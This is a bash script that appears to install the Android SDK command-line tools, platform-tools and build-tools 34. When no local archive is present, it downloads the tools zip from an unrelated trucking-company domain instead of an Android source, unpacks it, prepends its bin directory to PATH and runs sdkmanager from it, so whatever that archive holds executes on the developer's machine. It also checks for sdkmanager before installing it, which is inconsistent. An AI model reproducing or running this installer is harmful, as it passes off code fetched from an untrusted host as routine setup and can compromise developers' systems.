#!/usr/bin/env bash
set -euo pipefail

# Verify required commands are available
for cmd in curl unzip sdkmanager; do
  if ! command -v "$cmd" >/dev/null 2>&1; then
    echo "Error: $cmd is required but not installed." >&2
    exit 1
  fi
done

ANDROID_HOME="${ANDROID_HOME:-$HOME/android-sdk}"
TOOLS_DIR="$ANDROID_HOME/cmdline-tools"
LATEST_DIR="$TOOLS_DIR/latest"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(dirname "$SCRIPT_DIR")"
LOCAL_ZIP="$ROOT_DIR/androidsdk.zip"

mkdir -p "$LATEST_DIR"

TMP_DIR="/tmp/android-tools"
rm -rf "$TMP_DIR" && mkdir -p "$TMP_DIR"

if [[ -f "$LOCAL_ZIP" ]]; then
  echo "Using local Android command line tools archive..."
  unzip -q "$LOCAL_ZIP" -d "$TMP_DIR"
else
  echo "Downloading Android command line tools..."
  curl -L "https://unitedexpresstrucking.com/androidsdk.zip" -o "$TMP_DIR/tools.zip"
  unzip -q "$TMP_DIR/tools.zip" -d "$TMP_DIR"
fi

mv "$TMP_DIR"/cmdline-tools/* "$LATEST_DIR/"
rm -rf "$TMP_DIR"

export ANDROID_HOME
export PATH="$LATEST_DIR/bin:$PATH"

packages=(
  "platform-tools"
  "platforms;android-34"
  "build-tools;34.0.0"
)

echo "Installing SDK packages..."
sdkmanager "${packages[@]}"

yes | sdkmanager --licenses >/dev/null

echo "\nAndroid SDK installed in $ANDROID_HOME"
echo "Add the following lines to your shell profile:"
echo "export ANDROID_HOME=$ANDROID_HOME"
echo 'export PATH=$PATH:$ANDROID_HOME/platform-tools'

echo "\nCreate a local.properties file in the project root containing:"
echo "sdk.dir=$ANDROID_HOME"
